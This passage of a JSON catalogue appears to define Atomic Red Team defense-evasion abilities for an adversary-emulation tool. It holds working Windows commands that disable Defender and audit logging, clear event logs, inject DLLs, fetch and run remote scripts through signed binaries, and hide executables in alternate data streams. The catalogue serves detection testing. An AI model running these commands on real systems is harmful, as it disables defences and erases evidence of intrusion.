                    "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2e60ce3b2b9edcbec108a9abda95fa6f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "131ce77a48d6ab56106f694bcd7cc123": {
        "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.005",
            "name": "Masquerading: Match Legitimate Name or Location"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$Env:windir\\Temp\\svchost.exe\" -ErrorAction Ignore",
                    "command": "Add-Type -TypeDefinition @'; public class Test {;     public static void Main(string[] args) {;         System.Console.WriteLine(\"tweet, tweet\");     }; }; '@ -OutputAssembly \"$Env:windir\\Temp\\svchost.exe\"; Start-Process -FilePath \"$Env:windir\\Temp\\svchost.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "131ce77a48d6ab56106f694bcd7cc123",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0e38a868d902804ad6476396b735e152": {
        "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1202",
            "name": "Indirect Command Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0e38a868d902804ad6476396b735e152",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1b43591006b8e25b8df16ee52f0832bf": {
        "description": "Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, “Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.005",
            "name": "Indicator Removal on Host: Network Share Connection Removal"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net share ADMIN$ /UNLIMITED >nul 2>&1 && net share C$=C:\\ >nul 2>&1 && net share IPC$ >nul 2>&1",
                    "command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1b43591006b8e25b8df16ee52f0832bf",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d144770a9078d51bd6a3946ddbcb5fdb": {
        "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "taskkill /IM notepad.exe /f",
                    "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d144770a9078d51bd6a3946ddbcb5fdb",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a1abbab821742ff72600d2983ec704d6": {
        "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b && call \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a1abbab821742ff72600d2983ec704d6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "79297f1631143a6aacac233f0fd38bba": {
        "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.001",
            "name": "Indicator Removal on Host: Clear Windows Event Logs"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wevtutil cl System",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "79297f1631143a6aacac233f0fd38bba",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b7b12b4a8e954a5b6f1aa2a2b4690da5": {
        "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7b12b4a8e954a5b6f1aa2a2b4690da5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d179a90ba3d6fa4bb5ad82ff9d8f4841": {
        "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d179a90ba3d6fa4bb5ad82ff9d8f4841",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "93b4f004682dfb6d1af15e01c2859f93": {
        "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "93b4f004682dfb6d1af15e01c2859f93",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8ed19c3847fa411cb7fa02d06aae2cf6": {
        "description": "Executes a CHM file with the ITS protocol handler.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8ed19c3847fa411cb7fa02d06aae2cf6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fb72bea779b1152cad1c4aa74dfb189a": {
        "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fb72bea779b1152cad1c4aa74dfb189a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ef496d0f45511853fed8d8b07253cf52": {
        "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Install_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "ef496d0f45511853fed8d8b07253cf52",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5e74f249ed6da96c1918d8d81150a918": {
        "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.007",
            "name": "Signed Binary Proxy Execution: Msiexec"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{msi_exe} /y \"#{dll_payload}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5e74f249ed6da96c1918d8d81150a918",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "197a322f46033d8c1e5011967a0bce41": {
        "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "197a322f46033d8c1e5011967a0bce41",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "48ea8817c2cb2f078eb9bc1235cc877b": {
        "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc.exe config McAfeeDLPAgentService start= auto >nul 2>&1 && net.exe start McAfeeDLPAgentService >nul 2>&1",
                    "command": "net.exe stop McAfeeDLPAgentService && sc.exe config McAfeeDLPAgentService start= disabled",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "48ea8817c2cb2f078eb9bc1235cc877b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2f6c932bd5aabd4754c23a8de88a626e": {
        "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1140",
            "name": "Deobfuscate/Decode Files or Information"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\T1140_calc.txt >nul 2>&1 && del %temp%\\T1140_calc_decoded.exe >nul 2>&1",
                    "command": "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt && certutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2f6c932bd5aabd4754c23a8de88a626e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "4b3621d08052231fa6a8b7ed2c226085": {
        "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1127",
            "name": "Trusted Developer Utilities Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %TEMP%\\LibHello.js && del %TEMP%\\LibHello.dll",
                    "command": "copy 5bdafa_LibHello.js %TEMP%\\LibHello.js && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:library %TEMP%\\LibHello.js",
                    "payloads": [
                        "5bdafa_LibHello.js"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "4b3621d08052231fa6a8b7ed2c226085",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "66a5fd5f244819181f074dd082a28905": {
        "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.001",
            "name": "Hide Artifacts: Hidden Files and Directories"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /A:H %temp%\\T1564.001.txt >nul 2>&1",
                    "command": "attrib.exe +h %temp%\\T1564.001.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "66a5fd5f244819181f074dd082a28905",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1f0614ea5c4af6faf1b44570f5f22f8a": {
        "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.004",
            "name": "Masquerading: Masquerade Task or Service"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc delete win32times",
                    "command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" && sc qc win32times",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1f0614ea5c4af6faf1b44570f5f22f8a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "5235fbc85101dd5d45f00908ccd293a6": {
        "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5235fbc85101dd5d45f00908ccd293a6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6c35402f56f69f6eaf8c0cbe36fa1638": {
        "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "Gpscript /logon",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6c35402f56f69f6eaf8c0cbe36fa1638",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "4a84c192c11c6f4e8d20d5d36baa3c4c": {
        "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %TEMP%\\ie4uinit.exe >nul 2>&1 && del %TEMP%\\ieuinit.inf >nul 2>&1",
                    "command": "copy c:\\windows\\system32\\ie4uinit.exe %TEMP%\\ie4uinit.exe && copy cebed2_ieuinit.inf %TEMP%\\ieuinit.inf && %TEMP%\\ie4uinit.exe -BaseSettings",
                    "payloads": [
                        "cebed2_ieuinit.inf"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "4a84c192c11c6f4e8d20d5d36baa3c4c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e3624fa885fbc8781cd4826d5a914eda": {
        "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.004",
            "name": "Hide Artifacts: NTFS File Attributes"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\" && extrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe && findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe && certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt && makecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab && print /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe && reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg && regedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey && expand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat && esentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e3624fa885fbc8781cd4826d5a914eda",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "7de3d7b4922a7b996d8df36fb22bb118": {
        "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.004",
            "name": "Masquerading: Masquerade Task or Service"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "schtasks /tn win32times /delete /f",
                    "command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f && schtasks /query /tn win32times",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7de3d7b4922a7b996d8df36fb22bb118",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d590723bb9bb8f72b075f9717adb0d98": {
        "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /f %temp%\\T1036.003_masquerading.docx.exe > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.pdf.exe > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.ps1.exe > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.xls.vbs > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.xlsx.vbs > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.png.vbs > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.doc.ps1 > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.pdf.ps1 > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.rtf.ps1 > nul 2>&1",
                    "command": "copy C:\\Windows\\System32\\calc.exe %temp%\\T1036.003_masquerading.docx.exe /Y && copy C:\\Windows\\System32\\calc.exe %temp%\\T1036.003_masquerading.pdf.exe /Y && copy C:\\Windows\\System32\\calc.exe %temp%\\T1036.003_masquerading.ps1.exe /Y && copy 4bd145_T1036.003_masquerading.vbs %temp%\\T1036.003_masquerading.xls.vbs /Y && copy 4bd145_T1036.003_masquerading.vbs %temp%\\T1036.003_masquerading.xlsx.vbs /Y && copy 4bd145_T1036.003_masquerading.vbs %temp%\\T1036.003_masquerading.png.vbs /Y && copy 107417_T1036.003_masquerading.ps1 %temp%\\T1036.003_masquerading.doc.ps1 /Y && copy 107417_T1036.003_masquerading.ps1 %temp%\\T1036.003_masquerading.pdf.ps1 /Y && copy 107417_T1036.003_masquerading.ps1 %temp%\\T1036.003_masquerading.rtf.ps1 /Y && %temp%\\T1036.003_masquerading.docx.exe && %temp%\\T1036.003_masquerading.pdf.exe && %temp%\\T1036.003_masquerading.ps1.exe && %temp%\\T1036.003_masquerading.xls.vbs && %temp%\\T1036.003_masquerading.xlsx.vbs && %temp%\\T1036.003_masquerading.png.vbs && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1",
                    "payloads": [
                        "4bd145_T1036.003_masquerading.vbs",
                        "107417_T1036.003_masquerading.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "d590723bb9bb8f72b075f9717adb0d98",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bed1124145b52bffa8c9e0607c56f1c8": {
        "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body 9070cd_T1027-cc-macro.xlsm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "9070cd_T1027-cc-macro.xlsm"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "bed1124145b52bffa8c9e0607c56f1c8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d0bff81a46dbb6486aa1c58ef62d963e": {
        "description": "Executes an HTA Application by directly downloading from remote URI.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d0bff81a46dbb6486aa1c58ef62d963e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "be0cdc3812a6ed7cc1a2e6cb6ea14f58": {
        "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1127.001",
            "name": "Trusted Developer Utilities Proxy Execution: MSBuild"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe e93bc3_T1127.001.csproj",
                    "payloads": [
                        "e93bc3_T1127.001.csproj"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "be0cdc3812a6ed7cc1a2e6cb6ea14f58",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2a450a37a8601a2131ad0ecdb8188b54": {
        "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable && auditpol /set /category:\"Detailed Tracking\" /success:enable && auditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable",
                    "command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable && auditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable && auditpol /set /category:\"Detailed Tracking\" /success:disable",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2a450a37a8601a2131ad0ecdb8188b54",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "209d25131d45ef2d76e3bf69d200173f": {
        "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
